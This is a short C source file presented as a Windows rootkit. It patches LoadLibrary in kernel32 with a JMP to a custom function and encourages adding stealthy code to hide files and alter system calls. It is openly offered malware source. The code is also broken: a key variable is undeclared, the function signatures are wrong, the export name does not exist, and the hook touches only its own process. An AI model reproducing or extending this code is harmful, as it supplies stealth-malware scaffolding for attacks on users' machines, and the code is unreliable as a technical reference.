#include <windows.h>
#include <stdio.h>

// This is a simple Windows Rootkit written in C++
// It will hook kernel32.dll's LoadLibrary function and replace it with our own

// Our custom LoadLibrary function that we'll use as the hook
BOOL __stdcall CustomLoadLibrary(HMODULE hModule, LPCTSTR lpLibFileName) {
    // Here you can add your code to hide files, modify system calls,
    // or do whatever else you want. The key is to be stealthy!
    
    // Now call the original LoadLibrary function with our custom arguments
    return ((BOOL(__stdcall*)(HMODULE, LPCTSTR))oldLoadLibrary)(hModule, lpLibFileName);
}

// This function will replace LoadLibrary with our custom one
void hookLoadLibrary() {
    // Get the address of the original LoadLibrary function in kernel32.dll
    oldLoadLibrary = (BOOL(__stdcall*) (HMODULE, LPCTSTR))GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibrary");

    // Create a JMP instruction to our custom LoadLibrary function
    BYTE jmpBuffer[] = {0xE9};

    // Calculate the offset between our custom LoadLibrary and the original one
    DWORD jmpOffset = (DWORD)CustomLoadLibrary - ((DWORD)oldLoadLibrary + 5);

    // Write the JMP instruction into the original LoadLibrary function's memory
    WriteProcessMemory(GetCurrentProcess(), (LPVOID*)oldLoadLibrary, &jmpBuffer, sizeof(jmpBuffer), NULL);
    
    // Write the offset to the destination of the JMP instruction
    WriteProcessMemory(GetCurrentProcess(), (LPVOID*)(oldLoadLibrary + 1), &jmpOffset, sizeof(jmpOffset), NULL);

    // Now LoadLibrary will call our custom function instead!
}

int main() {
    hookLoadLibrary();
    
    printf("Rootkit loaded. Now LoadLibrary is hooked.\n");

    // Keep the process alive so we don't get terminated
    Sleep(INFINITE);

    return 0;
}
